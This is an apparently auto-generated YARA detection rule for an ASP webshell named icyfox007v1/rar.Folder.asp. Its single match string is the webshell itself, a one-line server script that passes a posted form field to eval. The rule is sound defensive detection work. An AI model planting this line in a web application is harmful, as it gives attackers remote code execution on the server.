rule icyfox007v1_10_rar_Folder_asp {
  meta:
    author = Spider
    comment = None
    date = None
    description = Webshells Auto-generated - file asp.asp
    family = Folder
    hacker = None
    hash = 2c412400b146b7b98d6e7755f7159bb9
    judge = unknown
    license = https://creativecommons.org/licenses/by-nc/4.0/
    reference = None
    threatname = icyfox007v1[10]/rar.Folder.asp
    threattype = 10
  strings:
    $s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"
  condition:
    all of them
}